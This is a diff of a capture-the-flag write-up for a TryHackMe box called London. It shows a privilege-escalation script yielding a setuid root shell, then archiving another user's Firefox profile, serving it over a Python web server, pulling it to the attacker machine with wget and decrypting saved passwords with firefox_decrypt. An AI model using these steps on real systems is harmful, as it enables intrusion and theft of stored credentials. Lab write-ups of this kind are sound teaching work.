+After running the script, it dropped a root shell right in my lap.
 
 ```bash
-root@london:/root# ls -la
-total 52
-drwx------  6 root root 4096 Apr 23  2024 .
-drwxr-xr-x 23 root root 4096 Apr  7  2024 ..
-lrwxrwxrwx  1 root root    9 Sep 18  2023 .bash_history -> /dev/null
--rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
-drwx------  3 root root 4096 Apr 23  2024 .cache
--rw-r--r--  1 beth beth 2246 Mar 16  2024 flag.py
--rw-r--r--  1 beth beth 2481 Mar 16  2024 flag.pyc
-drwx------  3 root root 4096 Apr 23  2024 .gnupg
-drwxr-xr-x  3 root root 4096 Sep 16  2023 .local
--rw-r--r--  1 root root  148 Aug 17  2015 .profile
-drwxr-xr-x  2 root root 4096 Mar 16  2024 __pycache__
--rw-rw-r--  1 root root   27 Sep 18  2023 .root.txt
--rw-r--r--  1 root root   66 Mar 10  2024 .selected_editor
--rw-r--r--  1 beth beth  175 Mar 16  2024 test.py
-root@london:/root# cat .root.txt 
+beth@london:/tmp$ ./pwn.sh
+...
+[+] Success:
+-rwsr-xr-x 1 root root 8384 Jul  9 07:12 /tmp/sh
+[*] Cleaning up...
+[*] Launching root shell: /tmp/sh
+# id
+uid=0(root) gid=1001(beth) groups=1001(beth)
+# cat /root/.root.txt
 THM{************************}
 ```
+And we are root!
 
+### Bonus Round: What's Charles Hiding?
 
-Time to get charles'es password.
-
+We're root, but I can't shake the feeling we left something behind. What about the other user, `charles`? As root, we can now freely explore his home directory.
 
 ```bash
-root@london:/home/charles# ls -la
+root@london:/root# ls -la /home/charles
 total 24
 drw------- 3 charles charles 4096 Apr 23  2024 .
 drwxr-xr-x 4 root    root    4096 Mar 10  2024 ..
@@ -1010,26 +590,25 @@ lrwxrwxrwx 1 root    root       9 Apr 23  2024 .bash_history -> /dev/null
 -rw------- 1 charles charles 3771 Mar 10  2024 .bashrc
 drw------- 3 charles charles 4096 Mar 16  2024 .mozilla
 -rw------- 1 charles charles  807 Mar 10  2024 .profile
-root@london:/home/charles# 
 ```
 
-We can look at .mozilla files in charleses directory. We can use a python script which extarcts all the passwords in .mozilla
-
-
-check out this repo.
-[unode/firefox_decrypt: Firefox Decrypt is a tool to extract passwords from Mozilla (Firefox™, Waterfox™, Thunderbird®, SeaMonkey®) profiles](https://github.com/unode/firefox_decrypt)
-
-
-
-I firstly tar'ded the .mozilla and downloaded my machine using python3 -m http.server 8000
-
-
-And runned the script in my machine.
-
+That `.mozilla` directory looks very promising. It likely contains Firefox browser data, including saved passwords. Let's exfiltrate it and see what we can find. I used `tar` to archive the directory, then downloaded it to my local machine with a Python web server.
 
 ```bash
-chmod -R 777 .mozilla
-❯ python firefox_decrypt.py .mozilla/firefox/8k3bf3zp.charles 
+# On the target machine
+root@london:/home/charles# tar -czvf mozilla.tar.gz .mozilla
+root@london:/home/charles# python3 -m http.server 8000
+
+# On my local machine
+❯ wget http://10.10.22.48:8000/mozilla.tar.gz
+❯ tar -xzvf mozilla.tar.gz
+```
+
+Now, with the Firefox profile on my machine, I used the amazing [unode/firefox_decrypt](https://github.com/unode/firefox_decrypt) tool to extract any saved credentials.
+
+```bash
+❯ chmod -R 777 .mozilla
+❯ python firefox_decrypt.py .mozilla/firefox/8k3bf3zp.charles
 2025-07-09 16:16:28,114 - WARNING - profile.ini not found in .mozilla/firefox/8k3bf3zp.charles
 2025-07-09 16:16:28,114 - WARNING - Continuing and assuming '.mozilla/firefox/8k3bf3zp.charles' is a profile location
 
@@ -1038,5 +617,6 @@ Username: 'Charles'
 Password: '**************'
 ```
 
+And there we have it! Charles's password for Buckingham Palace. A fitting end to our tour of London.
 
-And thats it.
+This was a really fun box with a great SSRF vulnerability leading to a home directory exposure. Thanks for reading, and happy hacking!
